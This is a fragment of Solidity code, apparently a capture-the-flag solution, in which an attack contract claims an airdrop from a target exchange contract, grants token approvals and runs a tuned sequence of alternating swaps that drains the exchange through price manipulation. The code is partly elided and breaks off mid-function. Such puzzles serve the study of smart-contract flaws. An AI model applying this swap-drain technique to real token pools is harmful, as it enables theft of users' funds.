...
contract att{
    ...
    function get() public {
        che.airdrop();
        ERC20(token1).approve(address(che), 1e22);
        ERC20(token2).approve(address(che), 1e22);

        // che.swap(token2, token1, 10);
        // che.swap(token1, token2, 9);
        // che.swap(token2, token1, 20);
        // che.swap(token1, token2, 13);
        // che.swap(token2, token1, 38);
        // che.swap(token1, token2, 33);
        // che.swap(token2, token1, 105);
        ...
        che.swap(token2, token1, 10);
        che.swap(token1, token2, 9);
        che.swap(token2, token1, 22);
        che.swap(token1, token2, 16);
        che.swap(token2, token1, 45);
        che.swap(token1, token2, 42);
        che.swap(token2, token1, 105);
        che.swap(token1, token2, 26);
